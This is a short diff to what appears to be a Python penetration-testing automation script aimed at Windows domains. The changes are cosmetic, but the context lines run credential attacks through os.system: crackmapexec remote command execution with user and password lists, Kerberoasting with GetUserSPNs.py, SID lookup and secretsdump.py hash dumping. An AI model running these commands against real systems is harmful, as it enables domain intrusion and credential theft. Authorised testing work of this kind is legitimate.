@@ -447,10 +447,10 @@ def KRPC():
 						os.system(f"crackmapexec smb {RHOST} -u keruser.txt -p johnpass.txt -X 'whoami' >> CommandExecution.txt")
 
 def IMPACKET():
-	if USERNAME == None and PASSWORD == None and USERSFILE is not None:
+	if USERNAME is None and PASSWORD is None and USERSFILE is not None:
 		with open ("domainname.txt", "r") as f:
 			y = f.read()
-		os.system(f"sudo echo {RHOST}    {y} >> /etc/hosts")
+		os.system(f"sudo echo {RHOST}   {y} >> /etc/hosts")
 		content = users
 		if (os.path.isfile(content) == True):
 			print(f"{YELLOW}{content} file found, trying some things{RESET}")
@@ -469,11 +469,11 @@ def IMPACKET():
 			os.system(f"GetUserSPNs.py {y}/{USERNAME}:{PASSWORD} -request >> impacket.txt")
 			os.system(f"lookupsid.py {y}/{USERNAME}:{PASSWORD}@{y} >> impacket.txt")
 			os.system(f"secretsdump.py {y}/{USERNAME}:{PASSWORD}@{y} > secretsdump.txt")
-	with open ("impacket.txt", "r") as f:
-		content = f.read()
-		print(f"{MAGENTA}Hopefully we got something from impacket, if not... that is ok just keep pushing\n {RESET}")
-		time.sleep(3)
-		print(content)
+		with open ("impacket.txt", "r") as f:
+			content = f.read()
+			print(f"{MAGENTA}Hopefully we got something from impacket, if not... that is ok just keep pushing\n {RESET}")
+			time.sleep(3)
+			print(content)
 
 def CRACKMAPEXEC():
 	if USERNAME is None and PASSWORD is None and USERSFILE is None:
